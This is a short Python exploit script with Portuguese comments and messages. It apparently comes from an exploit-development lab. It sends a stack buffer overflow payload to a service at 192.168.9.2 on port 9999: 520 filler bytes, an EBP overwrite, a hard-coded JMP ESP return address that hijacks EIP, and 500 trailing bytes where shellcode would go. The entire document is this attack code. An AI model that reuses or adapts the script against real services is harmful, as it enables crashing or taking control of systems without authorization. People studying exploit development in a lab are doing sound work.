import socket
from struct import pack
	
ip = "192.168.9.2"
port = 9999

n_bytes_crash = 520
n_bytes_ebp = 4
n_bytes_eip = 4 # Agora substitui pelo JMP ESP
n_bytes_buffer_salto = 500

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((ip,port))

print("[+] Enviando Buffer de 520 x 'A'| 4 x 'B' | JMP ESP | 500 x 'C' [+]")

buffer = b"A" * n_bytes_crash + b"B" * n_bytes_ebp # + b"C" * n_bytes_eip

buffer += pack('<I', 0x311712f3) # JMP ESP

buffer += b"D" * n_bytes_buffer_salto 
	
client.send(buffer)

client.close()
			
 
